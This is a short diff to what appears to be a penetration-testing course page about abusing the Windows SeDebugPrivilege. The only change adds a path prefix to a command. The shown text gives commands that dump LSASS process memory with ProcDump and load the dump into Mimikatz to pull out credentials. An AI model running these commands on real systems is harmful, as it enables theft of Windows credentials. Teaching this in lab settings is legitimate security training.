@@ -2,7 +2,7 @@
 [SeDebugPrivilege](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/debug-programs) can be used to capture sensitive information from system memory, or access/modify kernel and application structures. We can use [ProcDump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) from the [SysInternals](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite) suite to leverage this privilege and dump process memory.
 
 ```powershell
-C:\htb> procdump.exe -accepteula -ma lsass.exe lsass.dmp ### Dump LSASS
+C:\htb> .\procdump.exe -accepteula -ma lsass.exe lsass.dmp ### Dump LSASS
 
 C:\htb> mimikatz.exe
 mimikatz # sekurlsa::minidump lsass.dmp
